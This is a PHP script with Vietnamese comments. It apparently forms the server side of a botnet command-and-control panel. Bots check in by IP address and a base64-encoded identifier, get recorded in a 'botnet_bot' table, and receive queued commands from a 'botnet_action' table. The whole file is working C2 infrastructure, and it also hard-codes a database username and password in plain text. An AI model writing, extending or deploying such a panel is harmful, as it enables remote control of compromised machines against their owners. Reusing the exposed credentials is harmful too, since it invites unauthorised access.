<?php

$servername = "localhost";
$username = "ailurophile"; // thay đổi với username của bạn
$password = "Dinokulz123."; // thay đổi với mật khẩu của bạn
$dbname = "ailurophile"; // thay đổi với tên database của bạn

try {
    $pdo = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Kết nối thất bại: " . $e->getMessage());
}

// Hàm kiểm tra IP
function getUserIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

// Kiểm tra nếu có request GET với data=abcxyz
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['data'])) {
    // Lấy IP của client bằng hàm getUserIP
    $clientIp = getUserIP();
    
    // Kiểm tra xem IP có tồn tại trong bảng botnet_bot không
    $stmt = $pdo->prepare("SELECT id, other_info FROM botnet_bot WHERE ip = :ip LIMIT 1");
    $stmt->execute(['ip' => $clientIp]);
    $bot = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if ($bot) {
        // Nếu bot đã tồn tại, kiểm tra other_info
        if ($bot['other_info'] === base64_decode($_GET['data'])) {
            // Cập nhật last_time_connect của bot
            $updateStmt = $pdo->prepare("UPDATE botnet_bot SET last_time_connect = NOW() WHERE id = :id");
            $updateStmt->execute(['id' => $bot['id']]);
			$updateStmt = $pdo->prepare("UPDATE botnet_bot SET status='active' WHERE id = :id");
            $updateStmt->execute(['id' => $bot['id']]);
        }
    } else {
        // Nếu chưa có bot với IP này, thêm bot mới
        $insertStmt = $pdo->prepare("INSERT INTO botnet_bot (ip, other_info, status, last_time_connect) VALUES (:ip, :other_info, 'active', NOW())");
        $insertStmt->execute([
            'ip' => $clientIp,
            'other_info' => base64_decode($_GET['data']),
        ]);
        $bot['id'] = $pdo->lastInsertId();
    }

    // Kiểm tra botnet_action với botnet_bot_id và status="init"
    $actionStmt = $pdo->prepare("SELECT id, action, data FROM botnet_action WHERE botnet_bot_id = :botnet_bot_id AND status = 'init' LIMIT 1");
    $actionStmt->execute(['botnet_bot_id' => $bot['id']]);
    $action = $actionStmt->fetch(PDO::FETCH_ASSOC);

    if ($action) {
        // Nếu tìm thấy action phù hợp
        echo json_encode([
            "msg" => "success",
            "action_id" => $action['id'],
            "action" => $action['action'],
            "data" => $action['data'],
        ]);
		    $updateActionStmt = $pdo->prepare("UPDATE botnet_action SET status = 'pending' WHERE id = :id");
    $updateActionStmt->execute(['id' => $action['id']]);
    } else {
        // Nếu không có action phù hợp
        echo json_encode([
            "msg" => "success",
            "action_id" => "",
            "action" => "",
            "data" => "",
        ]);
    }
}
